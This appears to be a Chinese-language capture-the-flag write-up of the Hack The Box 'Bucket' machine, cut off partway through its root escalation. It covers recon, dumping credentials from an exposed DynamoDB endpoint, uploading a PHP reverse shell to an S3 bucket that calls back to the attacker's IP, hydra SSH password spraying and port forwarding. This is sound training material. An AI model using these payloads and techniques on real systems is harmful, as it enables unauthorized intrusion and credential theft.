{"pageProps":{"postData":{"id":"HackTheBoxMachine - Bucket","contentHtml":"<h1>Machine - Bucket</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/Bucket\">https://app.hackthebox.com/machines/Bucket</a> | <code>Linux</code> | <code>Medium</code></p>\n</blockquote>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<p>ç«¯å£æ‰«æ</p>\n<pre><code class=\"hljs language-bash\">âœ  Bucket nmap -sT -min-rate 5000 10.10.10.212\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 09:27 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> bucket.htb (10.10.10.212)\nHost is up (0.086s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 0.51 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">âœ  Bucket nmap -sT -A -p 22,80 10.10.10.212                             \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-06-06 09:28 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> bucket.htb (10.10.10.212)\nHost is up (0.12s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)\n|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)\n|_  256 18:<span class=\"hljs-built_in\">cd</span>:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)\n80/tcp open  http    Apache httpd 2.4.41\n|_http-title: Site doesn<span class=\"hljs-string\">'t have a title (text/html).\n|_http-server-header: Apache/2.4.41 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\nNetwork Distance: 2 hops\nService Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   108.02 ms 10.10.16.1\n2   54.68 ms  bucket.htb (10.10.10.212)\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 16.14 seconds\n</span></code></pre>\n<p>è®¿é—® <code>HTTP</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image1.png\" alt=\"image.png\"></p>\n<p>ä¸»é¡µä¸Šæ²¡æœ‰ä¸€ç‚¹ä¿¡æ¯ï¼Œå¯¹ç›®å½•è¿›è¡Œçˆ†ç ´</p>\n<pre><code class=\"hljs language-bash\">âœ  Bucket feroxbuster --url http://bucket.htb/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --filter-status 404,403 -x php,zip,txt \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben <span class=\"hljs-string\">\"epi\"</span> Risher ğŸ¤“                 ver: 2.11.0\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ¯  Target Url            â”‚ http://bucket.htb/\n ğŸš€  Threads               â”‚ 50\n ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n ğŸ’¢  Status Code Filters   â”‚ [404, 403]\n ğŸ’¥  Timeout (secs)        â”‚ 7\n ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0\n ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml\n ğŸ”  Extract Links         â”‚ <span class=\"hljs-literal\">true</span>\n ğŸ’²  Extensions            â”‚ [php, zip, txt]\n ğŸ  HTTP methods          â”‚ [GET]\n ğŸ”ƒ  Recursion Depth       â”‚ 4\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n404      GET        9l       31w      272c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n403      GET        9l       28w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n[#>------------------] - 88s    46359/882180  23m     found:0       errors:37     \nğŸš¨ Caught ctrl+c ğŸš¨ saving scan state to ferox-http_bucket_htb_-1749173567.state ...\n[#>------------------] - 88s    46399/882180  23m     found:0       errors:37     \n[#>------------------] - 88s    46400/882180  527/s   http://bucket.htb/         \n</code></pre>\n<p>ä½†æ˜¯æˆ‘æ³¨æ„åˆ°æºä»£ç ä¸­çš„å›¾ç‰‡æ˜¯é€šè¿‡å­åŸŸå<code>http://s3.bucket.htb</code> ä¸­è·å–çš„</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image2.png\" alt=\"image.png\"></p>\n<p>å°†å…¶æ·»åŠ åˆ° <code>hosts</code>ï¼Œå¹¶è®¿é—®ï¼Œåªæ˜¾ç¤º <code>running</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image3.png\" alt=\"image.png\"></p>\n<p>ç½‘ä¸Šæœç´¢ <code>s3</code> å¤§éƒ¨åˆ†éƒ½æ˜¯ <code>AWS S3</code> ï¼Œæ‰€ä»¥å‡å®šè¿™æ˜¯ä¸€ä¸ª <code>AWS S3</code> å®ä¾‹</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image4.png\" alt=\"image.png\"></p>\n<p>è·‘ä¸€ä¸‹ç›®å½•æ‰«æï¼Œèƒ½æ‰¾åˆ°ä¸¤ä¸ªå­ç›®å½•</p>\n<pre><code class=\"hljs language-bash\">âœBucket gobuster <span class=\"hljs-built_in\">dir</span> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,zip -u http://s3.bucket.htb\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://s3.bucket.htb\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster <span class=\"hljs-keyword\">in</span> directory enumeration mode\n===============================================================\n/health               (Status: 200) [Size: 54]\n/shell                (Status: 200) [Size: 0]\n/server-status        (Status: 403)\n</code></pre>\n<h2>AWS S3</h2>\n<blockquote>\n<p>å…³äºAWS S3 <a href=\"https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/Welcome.html\">https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/Welcome.html</a></p>\n</blockquote>\n<p>æ ¹æ®æ‰‹å†Œï¼Œ<code>adserver</code>æ˜¯ä¸€ä¸ªå­˜å‚¨æ¡¶ï¼Œ<code>images/bug.jpg</code> æ˜¯å¯¹è±¡é”®ï¼Œ<code>http://s3.bucket.htb</code> æ˜¯ç«¯ç‚¹</p>\n<p>è®¿é—® <code>/shell</code> ä¼šè¢«é‡å®šå‘åˆ°ä¸€ä¸ªå¥‡æ€ªçš„<code>URL</code>ï¼Œçœ‹èµ·æ¥åªåƒæ˜¯åªæœ‰å†…ç½‘å¯ä»¥è®¿é—®</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image5.png\" alt=\"image.png\"></p>\n<p>è®¿é—® <code>/health</code> å‘ç°é™¤äº† s3 è¿˜è¿è¡Œç€ <code>dynamodb</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image6.png\" alt=\"image.png\"></p>\n<blockquote>\n<p>å…³äº Dynamodb <a href=\"https://docs.amazonaws.cn/amazondynamodb/latest/developerguide/Introduction.html\">https://docs.amazonaws.cn/amazondynamodb/latest/developerguide/Introduction.html</a></p>\n</blockquote>\n<p>ä»æ–‡æ¡£ä¸Šçœ‹ï¼ŒDynamodb å’Œ S3 éƒ½å¯ä»¥ä½¿ç”¨ Amazon CLI æ¥è®¿é—®ï¼Œå¹¶ä¸”ä¸¤ä¸ªåº”ç”¨éƒ½æ˜¯å¯ä»¥é›†æˆçš„</p>\n<h3>Dynamodb</h3>\n<p>è®¿é—®<code>Dynamodb</code>å‰ï¼Œè¦å…ˆé…ç½®  <code>aws-cli</code></p>\n<p>PSï¼šå®˜æ–¹é…ç½®éœ€è¦ Access IDï¼Œå¹¶ä¸”æ³¨å†Œéœ€è¦ä¿¡ç”¨å¡ï¼Œä»¥ä¸ºå·®ç‚¹æ— äº†ï¼Œçœ‹äº†ä¸‹WPæ‰çŸ¥é“å¯ä»¥çå¡«</p>\n<pre><code class=\"hljs language-bash\">âœ  Bucket aws configure           \nAWS Access Key ID [None]: sunsetaction\nAWS Secret Access Key [None]: sunsetaction\nDefault region name [None]: CN\nDefault output format [None]: json\n</code></pre>\n<p>åˆ—å‡ºæ‰€æœ‰è¡¨</p>\n<pre><code class=\"hljs language-bash\">âœ  Bucket aws dynamodb list-tables --endpoint-url http://s3.bucket.htb\n{\n    <span class=\"hljs-string\">\"TableNames\"</span>: [\n        <span class=\"hljs-string\">\"users\"</span>\n    ]\n}\n</code></pre>\n<p>æŸ¥è¯¢è¡¨çš„æ•°æ®ï¼Œå¯ä»¥å¾—åˆ°å‡ ä¸ªç”¨æˆ·å‡­æ®</p>\n<pre><code class=\"hljs language-bash\">âœ  Bucket aws dynamodb scan --endpoint-url http://s3.bucket.htb --table-name <span class=\"hljs-built_in\">users</span>\n{\n    <span class=\"hljs-string\">\"Items\"</span>: [\n        {\n            <span class=\"hljs-string\">\"password\"</span>: {\n                <span class=\"hljs-string\">\"S\"</span>: <span class=\"hljs-string\">\"Management@#1@#\"</span>\n            },\n            <span class=\"hljs-string\">\"username\"</span>: {\n                <span class=\"hljs-string\">\"S\"</span>: <span class=\"hljs-string\">\"Mgmt\"</span>\n            }\n        },\n        {\n            <span class=\"hljs-string\">\"password\"</span>: {\n                <span class=\"hljs-string\">\"S\"</span>: <span class=\"hljs-string\">\"Welcome123!\"</span>\n            },\n            <span class=\"hljs-string\">\"username\"</span>: {\n                <span class=\"hljs-string\">\"S\"</span>: <span class=\"hljs-string\">\"Cloudadm\"</span>\n            }\n        },\n        {\n            <span class=\"hljs-string\">\"password\"</span>: {\n                <span class=\"hljs-string\">\"S\"</span>: <span class=\"hljs-string\">\"n2vM-&#x3C;_K_Q:.Aa2\"</span>\n            },\n            <span class=\"hljs-string\">\"username\"</span>: {\n                <span class=\"hljs-string\">\"S\"</span>: <span class=\"hljs-string\">\"Sysadm\"</span>\n            }\n        }\n    ],\n    <span class=\"hljs-string\">\"Count\"</span>: 3,\n    <span class=\"hljs-string\">\"ScannedCount\"</span>: 3,\n    <span class=\"hljs-string\">\"ConsumedCapacity\"</span>: null\n}\n</code></pre>\n<p>å°†å…¶æ‹¿å»å¯¹<code>ssh</code>è¿›è¡Œç¢°æ’ï¼Œä½†æ˜¯æ— ç»“æœï¼Œè²Œä¼¼ä¹Ÿèƒ½å¯¹æ•°æ®è¿›è¡Œå†™å…¥ï¼Œä½†æ˜¯ç°åœ¨ä¹Ÿæ²¡ç”¨</p>\n<h3>æ–‡ä»¶ä¸Šä¼ </h3>\n<p>æˆ‘ä»¬é€šè¿‡æ–‡æ¡£ <a href=\"https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/list-buckets.html\">https://docs.aws.amazon.com/zh_cn/AmazonS3/latest/userguide/list-buckets.html</a> å¯ä»¥çŸ¥é“å­˜åœ¨ <code>aws s3 ls</code> å‘½ä»¤ï¼Œè¯¥å‘½ä»¤ä½œç”¨æ˜¯å°†åœ¨å•ä¸ªéåˆ†é¡µè°ƒç”¨ä¸­åˆ—å‡ºæ‚¨è´¦æˆ·ä¸­çš„æ‰€æœ‰é€šç”¨å­˜å‚¨æ¡¶ã€‚</p>\n<pre><code class=\"hljs language-bash\">âœ  Bucket aws --endpoint-url http://s3.bucket.htb s3 <span class=\"hljs-built_in\">ls</span>\n2025-06-06 15:06:03 adserver\n</code></pre>\n<p>å‘½ä»¤ç»“æœæ˜¯æˆ‘ä»¬å’Œ<code>images</code> åœ¨åŒä¸€ç›®å½•ä¸‹</p>\n<p>æˆ‘ä»¬æŸ¥çœ‹å¸®åŠ©è¿˜èƒ½çœ‹åˆ° <code>cp</code> å‘½ä»¤ï¼Œé‚£ä¹ˆä»£è¡¨å¯èƒ½å¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œä¸Šä¼ </p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image7.png\" alt=\"image.png\"></p>\n<p>æˆ‘ä»¬ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æµ‹è¯•ä¸€ä¸‹</p>\n<pre><code class=\"hljs language-bash\">âœ  Bucket <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'&#x3C;?php phpinfo();?>'</span> > test.php                                                                                                                         \n\nâœ  Bucket aws --endpoint-url http://s3.bucket.htb s3 <span class=\"hljs-built_in\">cp</span> test.php s3://adserver/test.php\nupload: ./test.php to s3://adserver/test.php \n</code></pre>\n<p>å¯ä»¥ä¸Šä¼ ï¼Œä½†æ˜¯è²Œä¼¼æ— æ³•è§£æ</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image8.png\" alt=\"image.png\"></p>\n<p>è¿™é‡Œçœ‹äº†ä¸‹<code>WP</code>ï¼Œä¹‹å‰è¿›è¡Œç›®å½•æ‰«æ<code>s3</code>çš„æ—¶å€™èƒ½æ‰«æåˆ°<code>/server-status</code> ï¼Œé‚£ä¹ˆè¯¥å¤„å’Œ<code>bucket.htb</code>å¯èƒ½åœ¨åŒä¸€ç›®å½•ä¸‹ï¼Œè€Œä¸”å¯ä»¥æ”¯æŒè§£æ <code>php</code> æ‹“å±•å</p>\n<p>åœ¨ <code>adserver</code> ç›®å½•ä¸‹æ²¡æœ‰</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image9.png\" alt=\"image.png\"></p>\n<p>è¿™é‡Œé€šè¿‡ <code>ls</code> å‘½ä»¤æ¥æŸ¥çœ‹ <code>adserver</code>æ–‡ä»¶å¤¹å†…çš„æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°å­˜åœ¨<code>index.html</code> ï¼Œé‚£ä¹ˆå¯èƒ½å°±æ˜¯ä¸»ç«™</p>\n<pre><code class=\"hljs language-bash\">âœ  Bucket aws --endpoint-url http://s3.bucket.htb s3 <span class=\"hljs-built_in\">ls</span> s3://adserver                    \n                           PRE images/\n2025-06-06 15:48:02       5344 index.html\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image10.png\" alt=\"image.png\"></p>\n<p>è¿›è¡Œåå¼¹ <code>shell</code></p>\n<pre><code class=\"hljs language-bash\">&#x3C;?php <span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-string\">\"/bin/bash -c 'bash -i >&#x26; /dev/tcp/10.10.16.69/1234 0>&#x26;1'\"</span>);?>\n</code></pre>\n<p>å’Œä¹‹å‰ä¸€æ ·çš„æ“ä½œå¯ä»¥ç›´æ¥è·å¾—å¼¹å›æ¥çš„ <code>shell</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image11.png\" alt=\"image.png\"></p>\n<h2>æƒé™æå‡</h2>\n<h3>å¯†ç ç¢°æ’</h3>\n<p>å‘ç°å­˜åœ¨ç”¨æˆ·<code>roy</code></p>\n<pre><code class=\"hljs language-bash\">www-data@bucket:/var/www$ <span class=\"hljs-built_in\">ls</span> /home\nroy\n</code></pre>\n<p>æˆ‘ä»¬ä½¿ç”¨çš„åˆ°çš„å¯†ç è¿›è¡Œç¢°æ’</p>\n<pre><code class=\"hljs language-bash\">âœ  Bucket hydra -l roy  -P passwords.txt -t 12 10.10.10.212 ssh\nHydra v9.5 (c) 2023 by van Hauser/THC &#x26; David Maciejak - Please <span class=\"hljs-keyword\">do</span> not use <span class=\"hljs-keyword\">in</span> military or secret service organizations, or <span class=\"hljs-keyword\">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-06 16:13:00\n[WARNING] Many SSH configurations <span class=\"hljs-built_in\">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task\n[DATA] attacking ssh://10.10.10.212:22/\n[22][ssh] host: 10.10.10.212   login: roy   password: n2vM-&#x3C;_K_Q:.Aa2\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-06 16:13:06\n</code></pre>\n<p>æˆåŠŸå¾—åˆ° <code>Roy</code>çš„<code>shell</code></p>\n<pre><code class=\"hljs language-bash\">âœ  Bucket ssh roy@10.10.10.212   \nroy@10.10.10.212<span class=\"hljs-string\">'s password: \nWelcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Fri 06 Jun 2025 07:52:46 AM UTC\n\n  System load:                      0.05\n  Usage of /:                       33.9% of 17.59GB\n  Memory usage:                     30%\n  Swap usage:                       0%\n  Processes:                        256\n  Users logged in:                  2\n  IPv4 address for br-bee97070fb20: 172.18.0.1\n  IPv4 address for docker0:         172.17.0.1\n  IPv4 address for ens160:          10.10.10.212\n  IPv6 address for ens160:          dead:beef::250:56ff:feb9:cb55\n\n229 updates can be installed immediately.\n103 of these updates are security updates.\nTo see these additional updates run: apt list --upgradable\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Fri Jun  6 06:08:21 2025 from 10.10.16.27\nroy@bucket:~$ \n</span></code></pre>\n<p>å½“å‰ç›®å½•ä¸‹èƒ½å¾—åˆ° <code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">roy@bucket:~$ <span class=\"hljs-built_in\">cat</span> user.txt\n6e375b41aac41437da7b58d400a30c74\n</code></pre>\n<h3>ä¿¡æ¯æ”¶é›†</h3>\n<p><code>db.php</code></p>\n<pre><code class=\"hljs language-bash\">roy@bucket:~/project$ <span class=\"hljs-built_in\">cat</span> db.php\n&#x3C;?php\nrequire <span class=\"hljs-string\">'vendor/autoload.php'</span>;\ndate_default_timezone_set(<span class=\"hljs-string\">'America/New_York'</span>);\nuse Aws\\DynamoDb\\DynamoDbClient;\nuse Aws\\DynamoDb\\Exception\\DynamoDbException;\n\n<span class=\"hljs-variable\">$client</span> = new Aws\\Sdk([\n    <span class=\"hljs-string\">'profile'</span> => <span class=\"hljs-string\">'default'</span>,\n    <span class=\"hljs-string\">'region'</span>  => <span class=\"hljs-string\">'us-east-1'</span>,\n    <span class=\"hljs-string\">'version'</span> => <span class=\"hljs-string\">'latest'</span>,\n    <span class=\"hljs-string\">'endpoint'</span> => <span class=\"hljs-string\">'http://localhost:4566'</span>\n]);\n\n<span class=\"hljs-variable\">$dynamodb</span> = <span class=\"hljs-variable\">$client</span>->createDynamoDb();\n\n//todo\n</code></pre>\n<p>å†…éƒ¨å¼€æ”¾äº†å¥½å‡ ä¸ªç«¯å£</p>\n<pre><code class=\"hljs language-bash\">roy@bucket:~$ ss -tulpn\nNetid                  State                   Recv-Q                  Send-Q                                   Local Address:Port                                      Peer Address:Port                  Process\nudp                    UNCONN                  0                       0                                        127.0.0.53%lo:53                                             0.0.0.0:*\ntcp                    LISTEN                  0                       4096                                         127.0.0.1:42189                                          0.0.0.0:*\ntcp                    LISTEN                  0                       4096                                     127.0.0.53%lo:53                                             0.0.0.0:*\ntcp                    LISTEN                  0                       4096                                         127.0.0.1:4566                                           0.0.0.0:*\ntcp                    LISTEN                  0                       128                                            0.0.0.0:22                                             0.0.0.0:*\ntcp                    LISTEN                  0                       511                                          127.0.0.1:8000                                           0.0.0.0:*\ntcp                    LISTEN                  0                       511                                                  *:80                                                   *:*\ntcp                    LISTEN                  0                       128                                               [::]:22                                                [::]:*\n</code></pre>\n<p>æˆ‘ä»¬å°† <code>4566</code>å’Œ <code>8000</code>ç«¯å£è½¬å‘å‡ºå»</p>\n<pre><code class=\"hljs language-bash\">roy@bucket:~$ ./socat TCP-LISTEN:4567,fork tcp4:127.0.0.1:4566 &#x26;\n[1] 145731\nroy@bucket:~$ ./socat TCP-LISTEN:8001,fork tcp4:127.0.0.1:8000 &#x26;\n[2] 145736\n</code></pre>\n<p>å…¶ä¸­ <code>8000</code>ç«¯å£æ˜¯è²Œä¼¼æœªå®Œå·¥çš„</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image12.png\" alt=\"image.png\"></p>\n<p><code>4566</code>åƒæ˜¯<code>s3</code>çš„ç«¯ç‚¹</p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image13.png\" alt=\"image.png\"></p>\n<p>å°è¯•é€šè¿‡<code>aws</code>è®¿é—®</p>\n<pre><code class=\"hljs language-bash\">âœ  Bucket aws --endpoint-url http://bucket.htb:4567 s3 <span class=\"hljs-built_in\">ls</span>\n2025-06-06 16:04:01 adserver\n</code></pre>\n<p>å¯èƒ½æ˜¯ä¸€ä¸ªå†…éƒ¨ç«¯ç‚¹ï¼Œå°è¯•è¯»å–æ•°æ®åº“</p>\n<pre><code class=\"hljs language-bash\">âœ  Bucket aws dynamodb list-tables --endpoint-url http://bucket.htb:4567\n{\n    <span class=\"hljs-string\">\"TableNames\"</span>: [\n        <span class=\"hljs-string\">\"Music\"</span>,\n        <span class=\"hljs-string\">\"users\"</span>\n    ]\n}\n</code></pre>\n<p><code>users</code>å’Œæˆ‘ä»¬åœ¨å¤–éƒ¨ç«¯ç‚¹è®¿é—®çš„ä¸€æ ·ï¼Œ<code>Music</code>æ˜¯ç©ºçš„ï¼ˆå¯èƒ½å…¶ä»–äººä½¿ç”¨å®˜æ–¹æ–‡æ¡£ä¸­çš„è¯­å¥åˆ›å»ºçš„ï¼‰ï¼Œæ„Ÿè§‰å°±æ˜¯ä¹‹å‰çš„å¤–éƒ¨ç«¯ç‚¹</p>\n<h3>To root</h3>\n<p>å›åˆ°<code>8000</code>ç«¯å£ï¼Œæˆ‘ä»¬å‘ç°è¿™æ˜¯ä¸€ä¸ªä¸å°çš„é¡¹ç›®ï¼Œçº¿è·¯ä¹Ÿå¯èƒ½åœ¨è¿™é‡Œ</p>\n<pre><code class=\"hljs language-bash\">roy@bucket:/var/www/bucket-app$ <span class=\"hljs-built_in\">ls</span>\ncomposer.json  composer.lock  files  index.php  pd4ml_demo.jar  vendor\n</code></pre>\n<pre><code class=\"hljs language-bash\">roy@bucket:/var/www$ getfacl bucket-app/\n<span class=\"hljs-comment\"># file: bucket-app/</span>\n<span class=\"hljs-comment\"># owner: root</span>\n<span class=\"hljs-comment\"># group: root</span>\nuser::rwx\nuser:roy:r-x\ngroup::r-x\nmask::r-x\nother::---\n</code></pre>\n<p><code>index.php</code></p>\n<pre><code class=\"hljs language-bash\">roy@bucket:/var/www/bucket-app$ <span class=\"hljs-built_in\">cat</span> index.php\n&#x3C;?php\nrequire <span class=\"hljs-string\">'vendor/autoload.php'</span>;\nuse Aws\\DynamoDb\\DynamoDbClient;\n<span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$_SERVER</span>[<span class=\"hljs-string\">\"REQUEST_METHOD\"</span>]===<span class=\"hljs-string\">\"POST\"</span>) {\n        <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">\"action\"</span>]===<span class=\"hljs-string\">\"get_alerts\"</span>) {\n                date_default_timezone_set(<span class=\"hljs-string\">'America/New_York'</span>);\n                <span class=\"hljs-variable\">$client</span> = new DynamoDbClient([\n                        <span class=\"hljs-string\">'profile'</span> => <span class=\"hljs-string\">'default'</span>,\n                        <span class=\"hljs-string\">'region'</span>  => <span class=\"hljs-string\">'us-east-1'</span>,\n                        <span class=\"hljs-string\">'version'</span> => <span class=\"hljs-string\">'latest'</span>,\n                        <span class=\"hljs-string\">'endpoint'</span> => <span class=\"hljs-string\">'http://localhost:4566'</span>\n                ]);\n\n                <span class=\"hljs-variable\">$iterator</span> = <span class=\"hljs-variable\">$client</span>->getIterator(<span class=\"hljs-string\">'Scan'</span>, array(\n                        <span class=\"hljs-string\">'TableName'</span> => <span class=\"hljs-string\">'alerts'</span>,\n                        <span class=\"hljs-string\">'FilterExpression'</span> => <span class=\"hljs-string\">\"title = :title\"</span>,\n                        <span class=\"hljs-string\">'ExpressionAttributeValues'</span> => array(<span class=\"hljs-string\">\":title\"</span>=>array(<span class=\"hljs-string\">\"S\"</span>=><span class=\"hljs-string\">\"Ransomware\"</span>)),\n                ));\n\n                foreach (<span class=\"hljs-variable\">$iterator</span> as <span class=\"hljs-variable\">$item</span>) {\n                        <span class=\"hljs-variable\">$name</span>=rand(1,10000).<span class=\"hljs-string\">'.html'</span>;\n                        file_put_contents(<span class=\"hljs-string\">'files/'</span>.<span class=\"hljs-variable\">$name</span>,<span class=\"hljs-variable\">$item</span>[<span class=\"hljs-string\">\"data\"</span>]);\n                }\n                passthru(<span class=\"hljs-string\">\"java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/<span class=\"hljs-variable\">$name</span> 800 A4 -out files/result.pdf\"</span>);\n        }\n}\n<span class=\"hljs-keyword\">else</span>\n{\n?>\n</code></pre>\n<p>é€»è¾‘å¤§æ¦‚æ˜¯é€šè¿‡<code>POST</code>æ–¹æ³•è®¿é—®ï¼Œå¹¶ä¸”å‚æ•°<code>action</code>ç­‰äº<code>get_alerts</code> æ—¶ï¼Œå¯¹æ•°æ®è¿›è¡Œè¿æ¥ï¼Œç„¶åå¾ªç¯<code>alerts</code>è¡¨å¹¶ç­›é€‰è¡¨è¾¾å¼ä¸­Â <code>:title</code>Â å ä½ç¬¦çš„å€¼ï¼Œè¿™é‡Œä¸º \"<code>Ransomware</code>\"ã€‚å†ä¸‹é¢çš„å¾ªç¯ä¸Šè¾¹ç­›é€‰åçš„å€¼ï¼Œç”Ÿæˆä¸€ä¸ª1åˆ°10000ä¹‹é—´çš„éšæœºæ•°ï¼Œå¹¶é™„åŠ Â <code>.html</code>Â åç¼€ï¼Œä½œä¸º HTML æ–‡ä»¶åï¼Œå¹¶å°†ç­›é€‰åçš„å€¼çš„<code>data</code>å†™å…¥<code>HTML</code> æ–‡ä»¶ã€‚æš—ç¤ºäº†ä½ çš„ DynamoDBÂ <code>alerts</code>Â è¡¨ä¸­çš„é¡¹ç›®çš„Â <code>data</code>Â å±æ€§å­˜å‚¨çš„æ˜¯ HTML å†…å®¹ã€‚</p>\n<p>æœ€åä¸€è¡Œï¼Œè°ƒç”¨äº†<code>pd4ml_demo.jar</code> ï¼Œæä¾›ç”¨äº HTML åˆ° PDF è½¬æ¢çš„åŸºæœ¬ Java APIï¼ŒåŒ…æ‹¬ PD4ML JSP æ ‡ç­¾åº“ã€‚</p>\n<p>é‚£ä¹ˆæœ€åä¸€å¥å°±æ˜¯å°†ç”Ÿæˆ<code>HTML</code>æ–‡ä»¶é’»æ¢æˆ<code>PDF</code>æ–‡ä»¶ï¼Œå¹¶å­˜æ”¾åœ¨<code>files/result.pdf</code></p>\n<p><img src=\"/post-images/HackTheBoxMachine%20-%20Bucket/image14.png\" alt=\"image.png\"></p>\n<p>æˆ‘ä»¬è§‚å¯Ÿ<code>files</code>æ–‡ä»¶å¤¹æ²¡æœ‰ä»»ä½•æ–‡ä»¶äº§ç”Ÿï¼Œåº”è¯¥æ˜¯è¡¨<code>alerts</code>ä¸å­˜åœ¨ï¼Œæˆ‘ä»¬é¦–å…ˆåˆ›å»º<code>alerts</code>è¡¨</p>\n<pre><code class=\"hljs language-bash\">aws dynamodb create-table \\\n    --table-name alerts \\\n    --attribute-definitions \\\n        AttributeName=title,AttributeType=S \\\n        AttributeName=data,AttributeType=S \\\n    --key-schema \\\n        AttributeName=title,KeyType=HASH \\\n        AttributeName=data,KeyType=RANGE \\\n    --provisioned-throughput \\\n        ReadCapacityUnits=5,WriteCapacityUnits=5 \\\n    --endpoint-url 